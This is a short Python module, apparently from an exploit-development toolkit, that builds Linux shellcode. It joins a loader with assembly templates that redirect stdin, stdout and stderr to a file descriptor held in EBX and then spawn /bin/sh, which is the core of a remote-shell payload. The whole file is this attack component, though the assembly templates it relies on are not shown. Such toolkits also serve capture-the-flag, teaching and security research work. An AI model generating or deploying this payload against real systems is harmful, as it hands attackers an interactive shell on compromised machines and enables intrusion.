from core import *

def main(loader = ''):
    """Args: [loader]
    !! File descriptor must be placed in EBX.
    Sets stdin, stdout and stderr to file descriptor and spawns /bin/sh."""

    # ECX is clear after dup.asm
    return \
        asm(loader) + \
        template('linux/dup.asm', {}) + \
        template('linux/sh.asm', {})
